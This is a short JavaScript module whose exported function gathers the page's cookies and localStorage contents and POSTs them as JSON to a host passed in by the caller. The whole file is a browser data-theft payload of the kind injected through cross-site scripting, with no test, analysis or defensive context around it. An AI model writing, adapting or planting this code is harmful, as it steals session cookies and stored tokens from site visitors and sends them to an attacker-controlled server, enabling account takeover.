export default (host) => {
  let out = {
    cookie: document.cookie || "empty",
    localStorage: localStorage || "empty",
  };
  fetch(`http://${host}/x`, {
    method: "POST",
    body: JSON.stringify(out),
  });
};
